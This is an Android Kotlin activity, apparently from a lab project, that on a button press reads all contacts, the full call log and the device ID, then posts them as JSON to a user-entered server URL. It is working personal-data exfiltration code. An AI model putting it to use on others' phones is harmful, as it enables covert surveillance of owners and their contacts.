package com.lab.collector

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MainActivity : Activity() {

    private val perms = arrayOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    )
    private val io = Executors.newSingleThreadExecutor()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val status = findViewById<TextView>(R.id.status)
        val server = findViewById<EditText>(R.id.serverUrl)

        findViewById<Button>(R.id.collectBtn).setOnClickListener {
            if (!hasPerms()) {
                requestPermissions(perms, 1)
                return@setOnClickListener
            }
            status.text = "collecting…"
            io.execute {
                try {
                    val payload = buildPayload()
                    val code = post(server.text.toString(), payload.toString())
                    runOnUiThread { status.text = "server replied HTTP $code" }
                } catch (e: Exception) {
                    runOnUiThread { status.text = "error: ${e.message}" }
                }
            }
        }
    }

    private fun hasPerms() = perms.all {
        checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
    }

    private fun buildPayload(): JSONObject {
        val contacts = JSONArray()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                contacts.put(JSONObject()
                    .put("name", it.getString(0))
                    .put("number", it.getString(1)))
            }
        }

        val calls = JSONArray()
        val logCursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
            ), null, null, CallLog.Calls.DATE + " DESC"
        )
        logCursor?.use {
            while (it.moveToNext()) {
                calls.put(JSONObject()
                    .put("number", it.getString(0))
                    .put("name", if (it.isNull(1)) JSONObject.NULL else it.getString(1))
                    .put("date", it.getLong(2))
                    .put("duration_sec", it.getLong(3))
                    .put("type", callType(it.getInt(4))))
            }
        }

        return JSONObject()
            .put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            .put("contacts_count", contacts.length())
            .put("calls_count", calls.length())
            .put("contacts", contacts)
            .put("calls", calls)
    }

    private fun callType(t: Int) = when (t) {
        CallLog.Calls.INCOMING_TYPE -> "incoming"
        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
        CallLog.Calls.MISSED_TYPE -> "missed"
        CallLog.Calls.REJECTED_TYPE -> "rejected"
        else -> "other"
    }

    private fun post(url: String, body: String): Int {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.outputStream.use { it.write(body.toByteArray()) }
        val code = conn.responseCode
        conn.disconnect()
        return code
    }
}
